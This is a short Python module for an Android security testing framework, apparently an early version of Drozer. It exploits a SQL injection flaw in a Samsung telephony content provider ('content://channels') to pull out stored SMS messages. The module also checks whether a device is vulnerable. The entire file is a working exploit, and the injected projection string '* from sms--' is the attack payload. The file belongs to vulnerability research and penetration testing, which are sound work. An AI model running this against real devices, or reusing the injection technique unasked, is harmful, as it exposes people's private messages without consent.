from mwr.droidhg.modules import common, Module

class ChannelsSMS(Module, common.TableFormatter, common.Provider, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.android.providers.telephony."
    description = "Tests for Content Provider vulnerability in com.android.providers.telephony."
    examples = ""
    author = "Mike (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung"]

    label = "SMS messages using SQL injection flaw in the \"channels\" provider (com.android.providers.telephony)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://channels", projection=["* from sms--"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
